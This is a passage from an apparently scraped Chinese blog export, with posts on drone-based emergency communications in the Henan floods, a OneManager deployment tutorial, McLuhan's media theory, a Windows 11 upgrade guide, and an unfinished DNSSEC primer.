这种无线回传，基本上只能通过卫星通信系统实现。所以，翼龙-2H通信应急保障任务的难点，除了飞行平台本身之外（翼龙算是航空工业集团的成熟平台），就是空天链路的建立和调测。 空天一体化，这几年是通信领域的重点研究方向，也是6G的主要方向。埃隆马斯克的星链计划，更是大大刺激了人们对卫星通信的关注。 这次翼龙-2H刷屏网络，大家表面上看到的是无人机大放光彩，实际上背后真正发挥作用的，是卫星。 我们再来看看这次任务的具体执行情况： 7月21日下午14:22，翼龙-2H应急救灾型从安顺机场起飞，历时4.5个小时抵达巩义市，18时21分进入米河镇通信中断区，为50平方公里范围提供长时稳定连续信号覆盖。 截止20时，空中基站累计接通用户2572个，产生流量1089.89M，单次最大接入用户648个。 此次任务，无人机在任务区内作业时间共计8小时8分。无人机除了搭载通信设备，为受灾人员提供移动网络信号之外，还应用CCD航测相机、EO光电设备和SAR合成孔径雷达，对受灾区域进行拍照和监测，实时将有关信息回传至指挥中心，有效支持了灾区的应急救援行动。 7月22日6时15分，翼龙-2H应急救灾型无人机返场降落，飞行近16小时。 从上面的文字，我们可以看出几点细节。 首先，作业时间问题。 因为机场距离较远，无人机飞行在途时间较长（单程4小时以上），所以，在灾区的实际作业时间，并不是太久（大约8个小时，其中5小时用于覆盖信号）。 相信随着这次翼龙-2H的成功实践，应急管理部会在全国各个片区部署多个无人机基地，实现就近支援。 其次，载荷量问题。 翼龙2无人机最大起飞重量4200公斤，外挂载荷超过500公斤。按理来说，这个载荷量不算低。 但是，我们要知道，无人机需要执行多项任务（航拍等），挂载多种吊舱，所以，留给通信设备和配套电源的空间和重量配额有限，这限制了无人机通信保障服务的能力。 第三，多运营商支持问题。 本次任务，无人机只携带了中国移动的基站设备，联通和电信用户无法获取信号。后续的话，希望能够有支持三家运营商基本通信频段的全网通通信设备吊舱，作用会更大。 或者，希望各家运营商都有自己的无人机，帮到更多的灾民。 第四，价格成本问题。 应急保障，人命大于天，所以，成本问题可以稍微往后靠。 这次翼龙出动，尚不清楚具体的成本是多少，但估计费用不低（硬件成本、油费、人力成本、卫星链路租用等）。如果能大幅降低成本，将有利于这项技术的进一步普及，包括前面所说的全国各区域布点。 第五，带宽容量问题。 “累计接通用户2572个，产生流量1089.89M，单次最大接入用户648个”。说实话，就50平方公里的覆盖范围而言，这个数据并不算多（即便是农村地区），远不如一个普通的宏站。 一方面，可能说明还有大量的用户因为身处室内的原因，未能搜索到高空无人机基站的信号，另一方面，也可能是无人机基站本身的能力瓶颈。 无人机基站最大的弱点，就在于通信容量。卫星链路回传带宽的限制，决定了灾区人民看视频玩游戏是不太现实的，能保证通话、短信和微信，就已经很不错了。 以上问题，相信随着时间的推移、技术的发展，会逐渐得到解决。 应急通信的更多思考 接下来，我们延伸一下话题，再简单说说应急通信。 应急通信是一个重要的通信细分领域。根据灾害级别和范围的不同，手段也不太一样。 例如演唱会或体育赛事这样的区域性应急通信，往往出动应急通信车，就足以应付了。 而地震、洪水、海啸甚至恐怖袭击的话，应急通信车肯定没用，基本上都要靠卫星终端。 说实话，目前我国在商用（民用）卫星的市场化方面还是存在很大不足的。 全球主流的卫星通信系统，都是国外的服务提供商（海事卫星inmarsat、铱星iridium、欧星THURAYA等）。国内不少党政单位，包括抗灾应急，也在用国外商用卫星电话。这显然是不太合适的。 对于应急通信保障来说，保密性要求不是特别高，更关键的是普及。普及的话，又取决于成本。 如果国内民用卫星电话能够做大做强，那么可以进一步降低卫星使用成本，让卫星接收终端可以下沉普及到村镇一级，将有效应对重大自然灾害。 另外，我还想提一点：我们在应急通信保障技术方面，其实还有很大的想象空间。 突发奇想一下，我们有通信无人机，通信保障车，为什么不考虑研发一个通信无人船呢？基于MESH自组网技术的无人通信船，携带基站，穿梭在淹没的城市或农村区域，为灾民提供应急通信保障服务，也会非常有用。 此外，高空热气球、飞艇等，也都可以用于应急通信保障。这些此前都有先例，只不过尚未成熟，我们应该鼓励研究和尝试。 最后的最后，我再提醒大家一下：通信技术在重大自然灾害面前，并不是只有应急通信保障这一个作用。它更大的作用，其实是灾害预防和预警。 如果数字物联技术能够充分落地，我们将大幅减少灾害带来的损失。 例如这次河南洪灾。我们在视频上看到的危急场面，很多都是居民未能及时防范造成的。 如果关键河流、库区、涵洞、隧道都有水位数字传感器，实时汇报水位变化，通过洪灾预警系统对居民进行短信提醒，肯定有助于减少损失，挽救生命。 四川建成的地震预警系统，就是一个很好的例子。 此外，今年发生的多次重大伤亡事故，包括5·26广州江门井下中毒事故、6·13湖北十堰燃气爆炸事故、7·12苏州酒店倒塌事故，其实借助城市物联传感网络，都可以有效预防或者预警。 面对各种各样的自然灾害，数字技术还有很大的潜力可以挖掘，我们广大通信人和IT人，还有很多地方可以努力。 终有一天，当我们真正建成数字城市、数字世界的时候，面对自然灾害，我们将进行更为有力的反击。 好了，以上就是今天文章的全部内容。最后，再次为河南灾区加油，希望早日度过难关，生活恢复正常。 ","link":"https://blog.gd1214b.icu/post/ZWEkcveiz/"},{"title":"OneManager 部署教程","content":"OneManager是什么 这是一个利用微软onedrive api将onedrive目录映射成一个云盘的程序，类似的程序有很多，比如OneIndex、Pyone、OnePoint等等。这个程序的特点是支持多种onedrive类型，可以部署在多种平台上。 部署教程 本教程以在Glitch上部署为例.（建议挂梯） 打开Glitch 官网:https://glitch.com/ 点击 Log in 通过Github登录 新建一个项目 选择Import from Github 在弹出的对话框中输入 https://github.com/qkqpttgf/OneManager-php, 然后点击确定. 接下来Glitch将会为你导入该项目, 这可能会需要一点时间. 配置onemanager 项目导入完毕后, 依次点击 Show &gt;In a New Window 会打开一个新的页面： 然后按照提示往下走，设置好密码后会来到这个界面，点击登录： 输入密码后来到这个界面，点击管理＞设置： 点击“添加盘”： 填写标签和显示名称，根据自己的OneDrive账号选择第一或第二个选项： 点击确认，稍等一会即可看到这个界面： 登录你的OneDrive账号，接受许可： 稍等几秒后即可看到这个界面: 到此你的OneManager就算部署成功了. 高级设置 启用https Glitch默认不会启用https, 你可以在OneManager 的设置 &gt; 平台变量 中将 forceHttps 的值设置为1来启用 https : 自定义域名 在Glitch中,依次点击 Tools &gt; Custom Domains : 输入你的域名, 并点击Add Domain:(我这里的onemanager只是一个示例, 你可以用其他的二级域名) 在你的域名服务供应商中为你的域名添加一条解析: 类型为CNAME, 目标填 glitch.edgeapp.net （如果你在平台变量中开启了https，则不要开启cloudflare的橙色云）。 显示特定文件夹： 在public_path 中填入你想显示的文件夹名称（前面加个斜杆 / ），然后点击设置即可。 ","link":"https://blog.gd1214b.icu/post/3UOqAuzLr/"},{"title":"如何理解麦克卢汉的「媒介即信息」？","content":" 本文转自：https://mp.weixin.qq.com/s/xkL09_Tdljg8pk0v9taLjg “媒介即讯息”这个理论，本质含义没有那么复杂，实际上就是它的字面义：媒介本身才是最有价值的讯息。 但如果真这么简单，我们就不会把麦克卢汉的理论奉为圭臬，他大概也不能瞑目。只有把这样一个理论放在传播学的学科背景、麦克卢汉的思想体系以及对后世传播学的影响这三个方面加以思考，才能真正理解这一理论及其现实意义。 首先，“媒介即讯息”强调的是媒介形式也就是媒介本身的重要性。与“形式”相对的维度是“内容”，以手机为例，“手机”本身是一种媒介形式，而我们通过手机观看的东西如新闻、图片、视频等都是媒介内容（也就是“讯息”）。如果问形式和内容哪个对我们的影响更大，我想大部分人第一反应都是后者，也就是内容，毕竟人们直接阅读接收的东西才是影响认知、态度的主要因素，而非抽象的形式概念。 没错，这也是当时美国主流传播学界的看法。20世纪五六十年代，大部分学者都关注媒介内容对受众的影响。他们惯于使用量化、实验等实证方法，去测量内容如何影响受众的态度和行为。比如，看了一部电影、一则新闻之后，青少年的暴力倾向是不是更显著，这就是典型的传播学问题。由于这种研究取向较为科学、操作规范且可以重复，能够迅速产出调查报告，所以特别适合政府和广告商了解受众的需要，因此迅速发展成为传播学的主流范式——经验主义范式，并统治了这个学科几十年之久。“传播学之父”施拉姆在框定传播学四大奠基人时，选择的四位学者（拉斯韦尔、拉扎斯菲尔德、霍夫兰、勒温）都是经验主义学者。 诚然，偏向“内容”的研究取向能够为传播学赚取大量资金和政治支持，维系较长时间的“表面繁荣”。但问题是，着眼于内容对受众的影响，观测到的结果仅仅是微观的、短时间的效果和态度转变。虽然可以得到一大堆测量数据，但却无法进行上层理论建构。这样，作为一门学科的传播学还与其他学科有什么差别？又有什么学科发展的推动力量？传播学面临学科合法性危机。 就在这一时期，来自加拿大的传播学者麦克卢汉带着他的媒介理论横空出世。麦克卢汉大声疾呼：媒介即讯息！——媒介本身才是真正有价值的讯息！在《理解媒介》里，他举了一个例子，我们都是看门狗，媒介形式是小偷，而媒介内容是一块美味的肉，小偷为了转移注意力，将肉扔给我们，所以我们就只关注内容而忽略了形式的重要性。麦克卢汉以此呼吁学界要重视媒介本身。这是什么意思呢？再以手机为例诠释一下他的想法，如果说学者们关注的是手机里的内容对受众认知、态度、行为的影响，麦克卢汉则更加重视“手机”这个媒介本身对人与社会的整体影响，比如手机的出现，让“低头族”变多、人们的内容获取更为零散，由此导致思维的碎片化，整个社会的发展都朝向“移动化”转变。 再比如说，我们能够感知到“互联网”这一媒介对生活以及社会各个方面带来的巨大影响，但这些影响是互联网上各种零散的内容造成的吗？必然不是，这些影响是作为一个整体的互联网本身施加的。 这就是内容和形式的差别。如果说内容带来的是短效的态度转变，形式更多的是长期性的宏观变化。麦克卢汉指出，印刷术出现之后导致西方理性文明发展，电视出现之后带来人与社会的巨大转变，主导这一切的是形式而非内容，因此媒介本身才是对社会变迁带来深刻变化的主体——媒介即讯息。 可是在当时经验主义主导传播学的情况下，麦克卢汉的思想显得太过超前，并不被人所理解。美国学者大骂麦克卢汉是神棍，是骗子。但随着后来技术变革，尤其是互联网出现之后，媒介对人与社会的宰制力不断增强，人们对媒介认识不断深化，印证了麦克卢汉理论的正确性。传播学也完成了向媒介研究的转向。从这个层面来说，麦克卢汉和“媒介即讯息”是吹响变革的先行号角。他让学界与普通人注意到“媒介”形式本身的影响，这是他最大的历史功绩。 围绕“媒介即讯息”这个理论，麦克卢汉开始着手进行他的媒介理论版图构建。比如“媒介即人的延伸”、“冷热媒介”、“媒介四定律”等等，“媒介即讯息”是这些理论的“元命题”，也是所有媒介研究的“元命题”。 回到理论本身，“媒介即讯息”其实包含两个层面的含义。第一层，强调媒介形式才是最重要的，它能够对人与社会施加决定性影响。对人而言，麦克卢汉认为，媒介能影响人的感知结构，由此提出“冷热媒介”理论；对社会而言，媒介是社会发展的根本动力，还是区分不同社会形态的标志。他将人类文明分为三个阶段：口语传播时代、印刷传播时代以及电子传播时代。每个时代的时代特征都由媒介所决定。 “媒介即讯息”第二层含义是：“媒介，是另一种媒介的内容（讯息）”，特指旧媒介是新媒介的内容（讯息）。比如，口语是文字的内容，文字是印刷书籍的内容，图像是电影的内容，电影影像又是电视的内容。那什么媒介是互联网的内容呢？互联网的内容是在它之前的所有媒介，甚至连上网的人也是互联网的内容，这就是麦克卢汉说的，媒介即是讯息，使用者是媒介的内容。仔细想来，我们现在正处在自媒体时代，每个人都是互联网的生产者，我们生产出来的的内容构成了互联网本身，这可以说是麦克卢汉又一个成功的预言。 麦克卢汉的思想影响至今并依旧璀璨。1968年，在麦克卢汉的影响下，波兹曼创立“媒介环境学派”，与经验主义范式、批判主义范式并列为传播学三大学派，并将麦克卢汉尊为学派的奠基人。但波兹曼只是弱水三千取其一瓢，媒介环境只是麦克卢汉思想体系中一个分支，后来经过波兹曼、莱文森、林文刚等人的努力才逐渐发展壮大。 所以我不太同意「麦克卢汉建立了一个具有结构层次的“媒介环境”」的说法，事实上，对“媒介环境”的细分只是麦氏身后人的创造，所谓“社会环境、符号环境、感知环境”的提法出自林文刚的总结，是学派建制化的需要。要知道，麦克卢汉的理论并非是结构化鲜明的建构，更多是以创见和整体化描述为主，不能列出个1.2.3.4.5，这无论如何都是对他思想的一种矮化。我想说，用“媒介环境”来解释“媒介即讯息”只是文不对题、以偏概全。 总结而言，麦克卢汉的“媒介即讯息”强调的是媒介形式对人与社会发展的重要决定作用，在以关注“内容”为主要取向的传播学界，麦克卢汉让人们开始重视媒介形式本身的影响力。对传播学而言，麦克卢汉开辟了传播研究的媒介转向，让传播学不至于陷入效果研究的狭隘框架之中，并且为媒介环境学派的出现奠定理论基础、确立学科合法性。时至今日，麦克卢汉的准确预见和深刻洞见对互联网时代的特征充满解释力，让我们得以更加深刻地认识媒介化社会的媒介本质，由此也对麦氏理论更为重视。 而这一切，都源于一个年逾半百的加拿大学者在《理解媒介》的草稿纸上写下这几个字：“媒介，即讯息”。 ","link":"https://blog.gd1214b.icu/post/CRbjifrj5/"},{"title":"升级 Windows 11 碰壁了？送你一份尝鲜指南","content":" 本文转自: https://sspai.com/post/67498 本周，Windows 11 开始通过 Windows Insider Dev 通道向部分用户进行推送，但想要尝鲜却被 Windows 11 拒之门外的用户不在少数。 Windows 11 对设备的硬件配置究竟有什么要求，你的设备如何升级到 Windows 11？ 基于微软目前给出的相关文档、信息和部分用户的实际体验，本文整理了 Windows 11 尝鲜相关的常见问题，希望能够为你提供一些参考。 何时能升级 Windows 11 的首个预览版本 22000.51 已于 6 月 29 日面向 Windows Insider 推送，如果你的设备满足硬件配置要求，同时加入了 Windows 预览体验计划的 Dev 渠道，直接在设置中检查更新即可通过 OTA 升级，步骤与常规系统更新无异。 当然，预览版本的稳定性逊于正式版，Dev 渠道的代码未经过严格的可靠性验证，有较大几率出现影响正常使用的 bug。如果 Windows 是你的主要操作系统，我建议等待 Beta 渠道或 Release Preview 渠道开放后再考虑升级，不要贸然使用生产力设备尝鲜。 目前微软并未公布 Windows 11 正式版的具体推送日期，仅表示将在今年晚些时候推出，正在运行 Windows 10 的设备将在 2022 年上半年收到免费更新。 但发布会上的诸多暗示，以及沃尔玛等零售商的宣传语都指向了同一时间点。比如 The Verge 发布的一篇 报道 就指出，Windows 11 的正式推送时间或许会在今年 10 月，因为在不久前的 Windows 发布会中微软埋下了多处暗藏 Windows 11 正式推送日期的细节，包括 Microsoft Teams 对话消息、任务栏时间、日历事件、OneDrive 照片回顾等等，这些截图中的日期都指向了 2021 年 10 月 20 日。 哪些设备能升级 和当年的 Windows 10 类似，微软为推广 Windows 11 又一次祭出了「免费升级」大法，上一次是 Windows 7 和 Windows 8.x 的消费级版本可以免费升级至 Windows 10，这一次则是「符合要求的 Windows 10」可以免费升级到 Windows 11。 虽然都是免费的跨版本升级，措辞的变化也暗示着 Windows 11 对我们的设备有了新要求。 从这张最新的 Windows 11 系统要求中不难看出，要想「符合要求」并获得免费升级其实存在一定的硬件门槛。首先是 Windows 11 不存在 32 位版本，因此处理器必须支持 64 位，对应的就是内存达到 4GB 以上，存储空间也至少为 64GB。 但真正的难点，也是这次卡住很多人的关键，则是支持 UEFI 安全启动以及受信任的平台模块 (TPM) 2.0 版本。 UEFI 安全启动 因为当年需要让 Windows 7 和 Windows 8.1 用户平滑升级，因此 Windows 10 的最低系统要求几乎延续了 Windows 7 的要求，包括并不强制要求 UEFI 安全启动（Only UEFI）。 情况在 Windows 11 这里有了变化。 简单来说，在 Windows XP 时代我们只有 BIOS 启动，对应的磁盘分区结构则是 MBR，这样的结构一方面安全性较差，很多恶意程序可以在系统启动前就加载，另一方面最高也只能够支持到四个主分区，最高支持硬盘容量为 2TB。 因此之后就出现了 BIOS 的高级版本 UFEI，对应的分区表也采用了更新的 GPT。虽然 UEFI 在 2007 年就已经出现了，由于 Windows 7 开发时并没有成为标准，2012 年以后的 PC 虽然大多出厂就带有 UEFI 支持，为了兼容性（安装 Windows 7）还是会允许用户打开 Legacy 兼容模式来安装 Windows 7 或 32 位操作系统。 而到了 Windows 11 ，因为只支持 64 位操作系统，从安全性考虑就只允许采用 UEFI 安全启动的方式进行引导，也就是在系统 BIOS 中设置为「only UEFI」并且关闭 Legacy 兼容模式，这样才能正常的安装、运行 Windows 11。 TPM 2.0 UEFI 支持其实并不是这一次 Windows 11 系统要求中最为苛刻的，更苛刻的是系统最低要求中强制需要可信平台模块 2.0（TPM 2.0）。TPM 中文名叫做可信平台模块，英文 Trusted Platform Module，简单来说就是一个以硬件形式处理设备加密的工具，可以保护当前硬件设备的数据不被破解。 目前市面上的电脑如果支持 TPM ，一般上分为两种： 基于处理器主板的 TPM 在很多的品牌主板上都有集成，比如如果是 Intel 处理器上的主板，那么在 BIOS 里面会有个 Intel Platform Trust Technology 设置项目，而 AMD 处理器的主板有个类似的叫做 fTPM。它们都是属于集成的 TPM，如果你有相关设备，升级前记得打开即可。 基于独立加密模块的 TPM 有些主板中并没有集成Intel PTT或者 AMD 的 fTPM，那么就需要使用单独的芯片模块来实现 TPM 加密了。这个小模块通过针脚和主板进行通信，从而实现 TPM 功能。 当然微软也并没有完全说死 TPM 2.0 的支持，考虑到 OEM 设备商的利益（很多厂商从法律法规或利润最大化的角度并不会安装 TPM），微软在其最新的一版硬件需求说明文档中进行了特殊备注，表示可以允许经过其认证的设备在没有安装 TPM 2.0 的情况下预装 Windows 11 出货，因此最终的硬件支持上还要等待下半年正式版发货才能最终确定。 如何自检 微软在 Windows 11 发布活动的第一时间推出过一款硬件检查软件「电脑健康状况检查工具」，方便用户检测当前的设备是否满足升级到 Windows 11 的硬件需求。 打开软件之后点击「立即检查」就可以识别当前的硬件是否支持升级到 Windows 11，发布之初，这款工具并不会指出不符合的硬件到底哪一项不符合，虽然在之后的更新中解决，但微软还是决定暂时下线检查工具，进一步完善后重新推出。现在，我们可以通过一款第三方应用来进行检测。 这款名为「WhyNotWin11」的检查工具相比微软的检查工具提供了更为全面的信息，既包括了硬件中不符合最低硬件标准的信息项目，也包含了显卡支持等情况，相对来说信息要更为准确详细。 升级后的 Insider 提示判断 纵使系统硬件不支持，但我们依然可以使用各种「方法」升级到 Windows 11。但可以升级到 Windows 11 不代表万事大吉，微软将会在未来限制这些硬件能否使用正式版 Windows 11，甚至完全不满足的设备连 dev 测试版都将不再推送。 如果你已经在 Insider 中了，那么你可以通过「设置」- 「Windows 更新」-「Windows 预览体验计划」的提示信息查看自己的电脑是否符合正式版的需求还是只能呆在测试版。目前有三种情况： 本次 Windows 11 Dev 测试中，所有种类的 CPU 和是否具备 TPM 的电脑都将可以参与测试，但只要不支持 TPM 那么在「Windows 预览体验计划」的提示信息一定是红色的；未来正式版只推送给具备 TPM 2.0 和具备 兼容 处理器的电脑，当然也不排除 下放 给 7 代 Intel 和 AMD Zen 1 处理器的可能性。 如何升级 排查环境问题 鉴于上面提到的升级条件，你的设备如果在升级时遇到了阻碍，不妨先使用按照以下流程检查一下 TPM 相关原因： 若想了解当前设备是否支持 TPM，最简单的方法是以管理员身份运行 PowerShell，键入 Get-Tpm 指令并回车。TpmPresent 的值为 True 则代表硬件已集成 TPM 组件，TpmReady 为 True 代表 TPM 符合系统标准，其它信息的含义可参考 微软官方文档。 命令行提示不支持也不必灰心，让我们首先确认主板型号。使用快捷键 Win+R 然后运行 Msinfo32 打开系统信息面板，然后就能在右侧窗格中找到主板制造商和主板产品： 如果你和我一样使用的是 OEM 主机，获取到主板型号后可能还需要在相关品牌官网给出的信息中进一步查看实际主板型号，比如这里惠普 843B 主板对应的实际型号就是 Intel H370： 通过对 Intel H370 的主板信息进行检索可以进一步获悉，这块主板默认是支持 TPM 加密的，因此不排除 BIOS 屏蔽了相关选项。于是在进入 BIOS 并开启 TPM 开关后，我的设备成功满足了 Windows 11 Insider 的所有配置要求。 加入 Windows 预览体验计划 扫清硬件障碍后，请打开「设置」，依次进入「更新和安全」-「Windows 预览体验计划」，按提示加入「Dev 渠道」，再次检查更新，即可无缝升级至 Windows 11。成功上车后，在其它渠道开放前无法切换测试组，全新安装才能降级到稳定版本，请务必留心。 即使你的设备不满足 Windows 11 的全部硬件要求，也可以通过 Windows 预览体验计划暂时绕过限制。微软表示，6 月 24 日前加入 Dev 渠道的先行者们甚至可无视 TPM，继续收到更新推送。这一部分用户反馈的问题会被标记为「在不兼容设备上运行」，提交的 bug 可能不会被修复。 据微软说辞，Windows 11 正式发布后，不符合条件的设备会被踢出 Windows 预览体验计划，必须重新降级至 Windows 10——考虑到微软的作风，我对这条政策的实际执行力度持保留看法。但保不准微软这次就巨硬了，届时还想升级的话，手动安装镜像文件是个好方法。 通过 ISO 镜像手动升级 跨越版本号的重大系统更新，最稳妥的方法还是通过 ISO 镜像文件手动安装。由于微软尚未释出 Windows 11 的官方镜像文件，在本文发布的时间点，少数派不建议采用此方式升级，并提醒大家注意网络镜像版本与来源，避免个人数据丢失等意外情况出现。 你可以在 这里 检查官方 Windows 预览版本镜像，出现 Windows 11 选项后根据个人需求下载，选择保留数据或全新安装。 有什么新功能 首个预览版简单体验 首先是更现代更好看的设置界面，除了新图标，设置背景还采用了 云母石 的材质，把原本单调的背景变得更加生动。而且相比于旧版空旷的设置界面，新的设置界面信息密度明显更高；还有常驻于侧边栏的一级设置，方便用户快速回到上级菜单或是跳转到其他设置中。最后，新的设置对可以点击的地方做了箭头指示，相比旧版更加清晰明了。当然控制面板目前还在。 接下来就是日常中用得多的文件管理器也焕然一新，不仅把老旧的 Ribbon 组件给全部砍掉了，还用上了云母石材质和新的图标设计，显得更加简约简约现代。此外，系统级右键菜单也得到了改进全新的设计，变得更加直观明了；当然目前新右键菜单的功能并不算完善，如果想要访问旧版菜单可以使用新版菜单下的「显示更多选项」。 再者就是一些细节上的更新了，比方说通知中心、日期时间面板、快捷操作面板和输入法的重构，让整体可读性和易用性变得更好了。系统默认的终端也变成了更现代的 Windows Terminal；AutoHDR 也对部分游戏启用了，打开支持的游戏时会有启用通知。 最后，Windows 11 中的音效也有不小的改进，总得来说就是更加悦耳了，大家可以去网上找找有关视频。 这些旧功能被砍掉了 Windows 11 砍掉了不少来自 Window 10 的特性，下面我们一起来梳理下这些被砍掉的「新」功能。 首先是，Windows 10 刚推出时被赋予重任的语音助手 Cortana 终于不预装在系统里了，不仅是首次配置向导中不会被突如其来的语音吓到，任务栏上也不会出现用不到的图标了。喜欢 Cortana 的小伙伴依然即可从 Windows 11 的应用商店下载到它。 其次，IE 在 Windows 11 中正式被禁用，这意味着长达 25 年的浏览器正式下岗了。微软建议由 IE 使用需求的用户用 Microsoft Edge 的 IE 模式替代。不过话又说回来，目前不少政府的系统已经面向 Chrome 类浏览器开发了，大部分使用 IE 的场景都是为了用网银系统，希望国内的银行可以赶紧跟进。 再者 Windows 10 的时间轴功能也被砍了。时间线是 18 年 4 月份引入的功能，它能帮你记录你在什么时间在电脑上做了什么，方便你回溯操作。然而实际体验真的差到不行，操作界面不仅卡顿，而且大部分软件还不支持时间线的功能，甚至是第一方应用窗口截图都是空白的。现在在 Windows 11 里这个功能被彻底砍掉了。 最后由于 Windows 11 采用了新的开始菜单和任务栏，所以不少我们熟知的功能也都不见了，比如：动态磁贴、可对开始菜单调整大小、应用程序组等，而且任务栏目前也只能固定在屏幕底部，21H1 中加入的新闻与兴趣也被重新集成到小部件里了；此外平板模式也从 Windows 11 里移除了，新功能将体现在键盘的连接和分离状态中。 其他被砍掉的功能可以看 这里。总的来说 Windows 11 砍掉了不少 Windows 10 的特性，但是更早以前系统的组件却还保留着，让人不禁怀疑 Windows 11 是不是到头来什么都没有更新。 其他 如果你在更新后遇到了部分应用内文字乱码、游戏无法启动等问题，不妨检查一下「时间 &amp; 语言 &gt; 语言 &amp; 区域」设置中的「管理语言设置」选项，确保其中「非 Unicode 程序的语言」为 中文(简体, 中国)。这个操作对部分应用和游戏有效（比如《英雄联盟》）但不保证能够解决所有问题。 除此之外，目前 Windows 11 Dev 频道的预览体验版本还有着诸多其他问题，如多账户用户在升级后无法启动设置界面、搜索界面偶尔无法正常加载图标等等。你可以在微软官方 博客 的末尾查看这些问题，再决定是否升级。 ","link":"https://blog.gd1214b.icu/post/H1CZFGpSp/"},{"title":"DNSSEC 简介，签名的工作原理","content":" 本文转自：https://guozeyu.com/?p=2519 续之前的域名解析系统详解——基础篇，DNSSEC 是一组使域名解析系统（DNS）更加安全的解决方案。1993 年，IETF 展开了一个关于如何使 DNS 更加可信的公开讨论，最终决定了一个 DNS 的扩展——DNSSEC，并于 2005 年正式发布。然而，实际推行 DNSSEC 是一件非常难的事情，本文将讨论一下现有 DNS 系统所存在的一些不安全性，以及 DNSSEC 是如何解决这些问题的。 传统 DNS 的问题 从上一篇文章中已经知道，在你访问一个网站，比如 www.example.com 时，浏览器发送一个 DNS 消息到一个 DNS 缓存服务器上去查询，由于 DNS 系统的庞大，这中间还需要经过好几层 DNS 缓存服务器。想要正确访问到这个网站，就需要这所有的缓存服务器都要正确的响应。 DNS 的中间人攻击 DNS 查询是明文传输的，也就是说中间人可以在传输的过程中对其更改，甚至是去自动判断不同的域名然后去做特殊处理。即使是使用其他的 DNS 缓存服务器，如 Google 的 8.8.8.8，中间人也可以直接截获 IP 包去伪造响应内容。我可以给大家演示一下被中间人攻击之后是什么个情况： $ dig +short @4.0.0.0 facebook.com 243.185.187.39 向一个没有指向任何服务器的 IP 地址：4.0.0.0 发送一个 DNS 请求，应该得不到任何响应。可是实际上却返回了一个结果，很明显数据包在传输过程中“被做了手脚”。所以如果没有中间人攻击，效果是这样的： $ dig +short @4.0.0.0 facebook.com ;; connection timed out; no servers could be reached DNS 系统就是这么脆弱，和其他任何互联网服务一样，网络服务提供商、路由器管理员等均可以充当“中间人”的角色，来对客户端与服务器之间传送的数据包进行收集，甚至替换修改，从而导致客户端得到了不正确的信息。然而，通过一定的加密手段，可以防止中间人看到在互联网上传输的数据内容，或者可以知道原始的数据数据是否被中间人修改。 从密码学开始 讲到 DNSSEC，就不得不讲到一些密码学的知识。这里从最基本的密码学开始讲起。 密码学主要分为三大类，这里也列出每一列常用的加密算法： 对称密码学：AES、DES 公钥密码学：RSA、ECC 数据完整性的算法：SHA、MD5 在 DNSSEC 中，主要使用到的是公钥密码学和数据完整性算法两种加密学。 公钥密码学实现数字签名 公钥密码主要是与对称密码进行区分：对称密码的加密与解密使用相同的密钥；而公钥密码使用的加密密钥叫做公钥，解密密钥叫做私钥——两种密钥相对独立，不能替代对方的位置，而且知道公钥无法推出私钥。这两种密码学都必须是可逆的（所以解密算法可以看作加密算法的逆）。以函数的形式表达的话如下： 对称密码 密文 = 加密算法(密钥, 原文) 原文 = 解密算法(密钥, 密文) 公钥密码 密文 = 加密算法(公钥, 原文) 原文 = 解密算法(私钥, 密文) 当然，如果私钥充当公钥，公钥充当私钥，那么就是这样的： 密文 = 加密算法(私钥, 原文) 原文 = 解密算法(公钥, 密文) 假如服务器要向客户端发送一段消息，服务器有私钥，客户端有公钥。服务器使用私钥对文本进行加密，然后传送给客户端，客户端使用公钥对其解密。由于只有服务器有私钥，所以只有服务器可以加密文本，因此加密后的文本可以认证是谁发的，并且能保证数据完整性，这样加密就相当于给记录增加了数字签名。但是需要注意的是，由于公钥是公开的，所以数据只是不能被篡改，但可以被监听。 此处的服务器如果是充当 DNS 服务器，那么就能给 DNS 服务带来这个特性，然而一个问题就出现了，如何传输公钥？如果公钥是使用明文传输，那么攻击者可以直接将公钥换成自己的，然后对数据篡改。 所以，一个解决的方法是使用一个被公认的公钥服务器，客户端的操作系统中在本地先存好这个公钥服务器自身的公钥。当与服务器通信时，客户端从这个被公认的公钥服务器通信，用户使用操作系统中内置的公钥来解密获得服务器的公钥，然后再与服务器通信。 然而 DNS 是一个庞大的系统，在这个系统中根域名服务器充当了被公认的公钥服务器，其中每一个一级域名服务器也是一个子公钥服务器。这就是 DNSSEC 的基本雏形了。 数据完整性算法，减轻公钥密码的运算压力 在密码学中，还存在一种检查数据完整性的算法，其 “加密” 无须密钥，密文不可逆（或很难求逆），而且密文与原文不是一一对应的关系。而且，通过此算法算出的密文通常是一个固定长度的内容。通过此算法算出的密文叫做哈希值。在 DNSSEC 里所运用到它的特性是：原文一旦修改，密文就会发生变化。 公钥密码学存在的一个很重要的问题：加密和解密的速度相对于对称密码太慢了。所以想要提高性能，就需要减短需要加密和解密的文本。如果只是对文本的哈希值加密，由于长度的减短，加密速度就能大大提高。 在服务器传送时，同时传送明文的文本和使用私钥加密的文本哈希值；客户端只需要先算出收到的明文文本的哈希值，然后再用公钥解密密文，验证两个值是否相等，依然能够防止篡改。 在 DNSSEC 中就运用了这种方法，无论是对密钥还是记录的加密。 DNSSEC DNSSEC 这一个扩展可以为 DNS 记录添加验证信息，于是缓存服务器和客户端上的软件能够验证所获得的数据，可以得到 DNS 结果是真是假的结论。上一篇文章讲到过 DNS 解析是从根域名服务器开始，再一级一级向下解析，这与 DNSSEC 的信任链完全相同。所以部署 DNSSEC 也必须从根域名服务器开始。本文也就从根域名服务器讲起。 与 HTTPS 的区别 DNSSEC 和 HTTPS 是两个完全不同的东西，但是这里只是对其加密方式对比。即 DNSSEC 的加密方式与 TLS 进行对比。 信任链机制的不同 在配置 DNSSEC 的时候，如果与 HTTPS 比较，可以看出来：证书和私钥全部都是在自己的服务器上直接生成的，也就意味着这是 “自签名的”，不需要任何 “根证书颁发商”。二级域名所有者向一级域名注册商提交自己的公钥的哈希值，然后一级域名注册商就会给你的哈希值进行签名，从而也能形成一道信任链，远比 HTTPS 的信任链简单，操作系统也再不用内置那么多个 CA 证书，只需要一个根域名的 DS 记录即可。个人认为这是一个更先进的模式，但是它需要客户端一级一级的去依次解析，于是受到了速度的影响；HTTPS 则是直接由一个服务器返回整条证书链，与服务器进行 HTTPS 的连接时只需要与一个服务器通信。不过，DNS 记录是可以被缓存的，所以能够一定程度上的减少 DNSSEC 的延迟。 只签名，不加密 你发往 DNS 服务器的请求是明文的，DNS 服务器返回的请求是带签名的明文。这样 DNSSEC 只是保证了 DNS 不可被篡改，但是可以被监听，所以 DNS 不适合传输敏感信息，然而实际上的 DNS 记录几乎都不是敏感信息。HTTPS 的话会同时签名和双向加密，这样就能够传输敏感信息。 DNSSEC 